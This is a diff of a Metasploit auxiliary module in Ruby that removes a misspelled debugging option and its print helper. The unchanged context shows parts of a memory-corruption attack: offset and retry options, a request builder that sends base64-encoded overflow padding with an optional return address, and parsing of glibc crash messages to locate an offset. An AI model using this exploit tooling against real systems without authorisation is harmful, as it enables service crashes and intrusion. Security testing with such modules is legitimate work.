@@ -45,10 +45,6 @@ class MetasploitModule < Msf::Auxiliary
       OptInt.new('OFFSET_END',   [true, 'Ending offset (no crash)', 5000]),
       OptInt.new('RETRIES',      [true, 'Retry count for the attack', 3])
     ])
-
-    register_advanced_options([
-      OptBool.new('DEBEUG', [false, 'Print debugging messages', false])
-    ])
   end
 
   def check
@@ -176,8 +172,6 @@ class MetasploitModule < Msf::Auxiliary
   def send_request(m, ret = nil)
     @cnt = @cnt.to_i + 1
 
-    print_debeug(m)
-
     payload = Rex::Text.encode_base64(
       Rex::Text.rand_text(1) * m +
       (ret ? ret : Rex::Text.rand_text(4))
@@ -193,11 +187,6 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    if res
-      print_debeug(res.request)
-      print_debeug(res.headers)
-    end
-
     res
   end
 
@@ -206,12 +195,6 @@ class MetasploitModule < Msf::Auxiliary
       if name.include?('glibc detected')
         @offset = val.split[-2].to_i(16)
       end
-    end
-  end
-
-  def print_debeug(msg = '')
-    if datastore['DEBEUG']
-      print_line("%bld%cya[!]%clr #{msg}")
     end
   end
 
